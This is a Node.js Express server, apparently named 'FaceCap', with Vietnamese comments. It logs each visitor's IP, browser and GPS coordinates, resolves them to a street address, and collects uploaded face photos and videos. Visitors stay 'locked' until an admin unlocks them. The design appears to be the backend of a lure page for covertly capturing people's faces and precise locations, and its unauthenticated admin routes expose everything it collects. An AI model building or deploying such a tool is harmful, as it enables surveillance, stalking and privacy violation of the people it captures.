const express = require('express');
const multer = require('multer');
const cron = require('node-cron');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const https = require('https');
const { v4: uuidv4 } = require('uuid');

const app = express();
const PORT = 3000;

// Thư mục uploads
const uploadsDir = path.join(__dirname, 'uploads');
const videosDir = path.join(__dirname, 'uploads', 'videos');
if (!fs.existsSync(uploadsDir)) fs.mkdirSync(uploadsDir, { recursive: true });
if (!fs.existsSync(videosDir)) fs.mkdirSync(videosDir, { recursive: true });

// In-memory session lock store
// { sessionId: { locked: true, unlockedAt: null, ip, userAgent, visitedAt, location } }
const sessionStore = new Map();

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));
app.use('/uploads', express.static(uploadsDir));
app.use('/uploads/videos', express.static(videosDir));

// === Helper: Reverse Geocode ===
function reverseGeocode(latitude, longitude) {
  return new Promise((resolve) => {
    const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`;

    https.get(url, { headers: { 'User-Agent': 'FaceCap-Server' } }, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        try {
          const result = JSON.parse(data);
          const address = result.address || {};
          const houseNum = address.house_number ? `${address.house_number} ` : '';
          const street = address.road || address.street || address.residential || 'Không xác định';
          const ward = address.suburb || address.neighbourhood || '';
          const district = address.county || address.city_district || '';

          const fullAddress = `${houseNum}${street}${ward ? ', ' + ward : ''}${district ? ', ' + district : ''}`;
          resolve(fullAddress.trim());
        } catch (e) {
          resolve('Không xác định địa chỉ');
        }
      });
    }).on('error', () => resolve('Lỗi lấy địa chỉ'));
  });
}

// === API ROUTES ===

// ---- Session Management ----

// Đăng ký session mới (người dùng vào trang)
app.post('/api/session/register', async (req, res) => {
  const sessionId = uuidv4();
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const userAgent = req.headers['user-agent'];
  const { location } = req.body;

  let address = null;
  if (location && location.latitude && location.longitude) {
    address = await reverseGeocode(location.latitude, location.longitude);
  }

  sessionStore.set(sessionId, {
    locked: true,
    unlockedAt: null,
    ip,
    userAgent,
    visitedAt: new Date().toISOString(),
    location: location || null,
    address: address
  });

  console.log(`[${new Date().toLocaleString('vi-VN')}] 🔒 Visitor mới: ${sessionId} - IP: ${ip}${address ? ` - ${address}` : ''}`);

  res.json({ success: true, sessionId });
});

// Kiểm tra trạng thái lock của session (client polling)
app.get('/api/session/status/:sessionId', (req, res) => {
  const session = sessionStore.get(req.params.sessionId);
  if (!session) return res.json({ locked: true }); // nếu không tìm thấy → vẫn lock
  res.json({ locked: session.locked });
});

// Lấy danh sách tất cả sessions đang bị lock (cho admin)
app.get('/api/sessions', (req, res) => {
  const list = [];
  sessionStore.forEach((data, sessionId) => {
    list.push({ sessionId, ...data });
  });
  // Sắp xếp mới nhất trước
  list.sort((a, b) => new Date(b.visitedAt) - new Date(a.visitedAt));
  res.json(list);
});

// Admin unlock 1 session
app.post('/api/session/unlock/:sessionId', (req, res) => {
  const session = sessionStore.get(req.params.sessionId);
  if (!session) return res.status(404).json({ error: 'Session không tồn tại' });

  session.locked = false;
  session.unlockedAt = new Date().toISOString();
  console.log(`[${new Date().toLocaleString('vi-VN')}] 🔓 Đã mở khóa session: ${req.params.sessionId}`);
  res.json({ success: true });
});

// Admin unlock tất cả sessions
app.post('/api/session/unlock-all', (req, res) => {
  sessionStore.forEach((data) => {
    data.locked = false;
    data.unlockedAt = new Date().toISOString();
  });
  console.log(`[${new Date().toLocaleString('vi-VN')}] 🔓 Đã mở khóa TẤT CẢ sessions`);
  res.json({ success: true });
});

// Admin xóa session
app.delete('/api/session/:sessionId', (req, res) => {
  sessionStore.delete(req.params.sessionId);
  res.json({ success: true });
});

// Upload ảnh từ client
app.post('/api/upload', multer({
  storage: multer.diskStorage({
    destination: (req, file, cb) => cb(null, uploadsDir),
    filename: (req, file, cb) => {
      const timestamp = Date.now();
      cb(null, `face_${timestamp}.jpg`);
    }
  }),
  limits: { fileSize: 10 * 1024 * 1024 }
}).single('photo'), async (req, res) => {
  if (!req.file) return res.status(400).json({ error: 'Không có file' });

  let location = null;
  let address = null;

  if (req.body.location) {
    try {
      location = JSON.parse(req.body.location);
      address = await reverseGeocode(location.latitude, location.longitude);
    } catch (e) {
      console.log('Invalid location data');
    }
  }

  const photoData = {
    filename: req.file.filename,
    originalname: req.file.originalname,
    size: req.file.size,
    uploadedAt: new Date().toISOString(),
    expiresAt: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString(),
    ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress,
    userAgent: req.headers['user-agent'],
    location: location,
    address: address,
    sessionId: req.body.sessionId || null
  };

  const metaFile = path.join(uploadsDir, `${req.file.filename}.json`);
  fs.writeFileSync(metaFile, JSON.stringify(photoData, null, 2));

  console.log(`[${new Date().toLocaleString('vi-VN')}] 📸 Ảnh mới: ${req.file.filename} - IP: ${photoData.ip}${address ? ` - Địa chỉ: ${address}` : ''}`);
  res.json({ success: true, filename: req.file.filename });
});

// Lấy danh sách ảnh (cho admin)
app.get('/api/photos', (req, res) => {
  const files = fs.readdirSync(uploadsDir).filter(f => f.endsWith('.jpg'));
  const photos = files.map(filename => {
    const metaFile = path.join(uploadsDir, `${filename}.json`);
    let meta = { filename, uploadedAt: new Date().toISOString(), ip: 'Unknown' };
    if (fs.existsSync(metaFile)) {
      meta = JSON.parse(fs.readFileSync(metaFile, 'utf-8'));
    }
    return {
      ...meta,
      url: `/uploads/${filename}`,
      timeLeft: Math.max(0, new Date(meta.expiresAt) - Date.now())
    };
  });

  photos.sort((a, b) => new Date(b.uploadedAt) - new Date(a.uploadedAt));
  res.json(photos);
});

// Xóa ảnh thủ công
app.delete('/api/photos/:filename', (req, res) => {
  const filename = req.params.filename;
  const imgPath = path.join(uploadsDir, filename);
  const metaPath = path.join(uploadsDir, `${filename}.json`);

  if (!fs.existsSync(imgPath)) return res.status(404).json({ error: 'Không tìm thấy ảnh' });

  fs.unlinkSync(imgPath);
  if (fs.existsSync(metaPath)) fs.unlinkSync(metaPath);

  console.log(`[${new Date().toLocaleString('vi-VN')}] 🗑️ Đã xóa: ${filename}`);
  res.json({ success: true });
});

// === Video Routes ===

// Upload video từ client
const videoUpload = multer({
  storage: multer.diskStorage({
    destination: (req, file, cb) => cb(null, videosDir),
    filename: (req, file, cb) => {
      const ext = file.originalname.endsWith('.mp4') ? 'mp4' : 'webm';
      cb(null, `video_${Date.now()}.${ext}`);
    }
  }),
  limits: { fileSize: 150 * 1024 * 1024 } // 150MB
});

app.post('/api/upload-video', videoUpload.single('video'), (req, res) => {
  if (!req.file) return res.status(400).json({ error: 'Không có file' });

  const videoData = {
    filename: req.file.filename,
    size: req.file.size,
    uploadedAt: new Date().toISOString(),
    expiresAt: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString(),
    ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress,
    userAgent: req.headers['user-agent'],
    sessionId: req.body.sessionId || null
  };

  const metaFile = path.join(videosDir, `${req.file.filename}.json`);
  fs.writeFileSync(metaFile, JSON.stringify(videoData, null, 2));

  console.log(`[${new Date().toLocaleString('vi-VN')}] 🎥 Video mới: ${req.file.filename} - IP: ${videoData.ip} - ${(req.file.size / 1024 / 1024).toFixed(2)}MB`);
  res.json({ success: true, filename: req.file.filename });
});

// Lấy danh sách video (cho admin)
app.get('/api/videos', (req, res) => {
  const files = fs.readdirSync(videosDir).filter(f => f.endsWith('.webm') || f.endsWith('.mp4'));
  const videos = files.map(filename => {
    const metaFile = path.join(videosDir, `${filename}.json`);
    let meta = { filename, uploadedAt: new Date().toISOString(), ip: 'Unknown' };
    if (fs.existsSync(metaFile)) {
      meta = JSON.parse(fs.readFileSync(metaFile, 'utf-8'));
    }
    return {
      ...meta,
      url: `/uploads/videos/${filename}`,
      timeLeft: Math.max(0, new Date(meta.expiresAt || Date.now()) - Date.now())
    };
  });
  videos.sort((a, b) => new Date(b.uploadedAt) - new Date(a.uploadedAt));
  res.json(videos);
});

// Xóa video thủ công
app.delete('/api/videos/:filename', (req, res) => {
  const filename = req.params.filename;
  const vidPath = path.join(videosDir, filename);
  const metaPath = path.join(videosDir, `${filename}.json`);

  if (!fs.existsSync(vidPath)) return res.status(404).json({ error: 'Không tìm thấy video' });

  fs.unlinkSync(vidPath);
  if (fs.existsSync(metaPath)) fs.unlinkSync(metaPath);

  console.log(`[${new Date().toLocaleString('vi-VN')}] 🗑️ Đã xóa video: ${filename}`);
  res.json({ success: true });
});

// Thống kê
app.get('/api/stats', (req, res) => {
  const photos = fs.readdirSync(uploadsDir).filter(f => f.endsWith('.jpg'));
  const videos = fs.readdirSync(videosDir).filter(f => f.endsWith('.webm') || f.endsWith('.mp4'));
  res.json({ totalPhotos: photos.length, totalVideos: videos.length, activeSessions: sessionStore.size });
});

// === CRON JOB: Tự xóa ảnh + video sau 24 giờ ===
cron.schedule('*/10 * * * *', () => {
  let deletedPhotos = 0, deletedVideos = 0;

  // Xóa ảnh hết hạn
  fs.readdirSync(uploadsDir).filter(f => f.endsWith('.jpg')).forEach(filename => {
    const metaFile = path.join(uploadsDir, `${filename}.json`);
    if (fs.existsSync(metaFile)) {
      const meta = JSON.parse(fs.readFileSync(metaFile, 'utf-8'));
      if (new Date() > new Date(meta.expiresAt)) {
        fs.unlinkSync(path.join(uploadsDir, filename));
        fs.unlinkSync(metaFile);
        deletedPhotos++;
      }
    }
  });

  // Xóa video hết hạn
  fs.readdirSync(videosDir).filter(f => f.endsWith('.webm') || f.endsWith('.mp4')).forEach(filename => {
    const metaFile = path.join(videosDir, `${filename}.json`);
    if (fs.existsSync(metaFile)) {
      const meta = JSON.parse(fs.readFileSync(metaFile, 'utf-8'));
      if (new Date() > new Date(meta.expiresAt)) {
        fs.unlinkSync(path.join(videosDir, filename));
        fs.unlinkSync(metaFile);
        deletedVideos++;
      }
    }
  });

  if (deletedPhotos > 0 || deletedVideos > 0) {
    console.log(`[Auto-Delete] Xóa ${deletedPhotos} ảnh, ${deletedVideos} video hết hạn`);
  }
});

// Dọn session quá cũ (> 24h)
cron.schedule('0 * * * *', () => {
  const cutoff = Date.now() - 24 * 60 * 60 * 1000;
  sessionStore.forEach((data, id) => {
    if (new Date(data.visitedAt).getTime() < cutoff) {
      sessionStore.delete(id);
    }
  });
});

// Start server
app.listen(PORT, () => {
  console.log(`\n🚀 Server đang chạy tại: http://localhost:${PORT}`);
  console.log(`📸 Trang người dùng: http://localhost:${PORT}`);
  console.log(`🔐 Trang Admin:      http://localhost:${PORT}/admin.html`);
  console.log(`📁 Ảnh lưu tại:      ${uploadsDir}\n`);
});
